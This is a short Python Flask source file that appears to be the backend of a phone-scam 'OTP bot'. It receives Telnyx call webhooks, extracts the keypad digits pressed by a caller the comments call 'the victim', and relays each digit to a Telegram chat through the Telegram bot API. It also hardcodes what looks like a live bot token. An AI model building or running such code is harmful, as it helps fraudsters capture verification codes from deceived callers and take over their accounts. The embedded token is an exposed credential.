import requests
from flask import Flask, request

app = Flask(__name__)

# Telegram Bot Token (replace with your actual bot token)
TELEGRAM_BOT_TOKEN = "7823113872:AAEjpmOaB2lq6ubnZCzwM3wa9qvCxw5B1e0"

@app.route('/telnyx_webhook', methods=['POST'])
def telnyx_webhook():
    # Log the incoming request body
    data = request.json
    print(f"Received JSON data: {data}")  # Log the entire JSON data
    
    # Extract telegram_user_id from the URL query parameters
    telegram_user_id = request.args.get('telegram_user_id', None)
    print(f"Telegram User ID: {telegram_user_id}")
    
    # Extract the digit pressed by the victim from the incoming data
    digit = data.get('data', {}).get('payload', {}).get('digit', None)
    
    # Log the digit pressed (if available)
    if digit:
        print(f"Digit Pressed: {digit}")
        # Call the function to send the message to the Telegram bot
        send_telegram_message(telegram_user_id, f"The victim pressed: {digit}")
    else:
        print("No digit pressed.")
    
    # Optionally, log the entire payload or any other part of the data
    payload = data.get('data', {}).get('payload', {})
    print(f"Payload data: {payload}")
    
    # Return a success response
    return 'OK', 200

def send_telegram_message(user_id, message):
    """Send a message to the Telegram user."""
    url = f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage'
    params = {'chat_id': user_id, 'text': message}
    
    # Send the request to Telegram
    response = requests.get(url, params=params)
    
    # Log the response for debugging
    print(f"Sent message to Telegram user {user_id}: {message}, Response: {response.status_code}, Response Text: {response.text}")

    print(response.status_code)
    print(response.text)

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
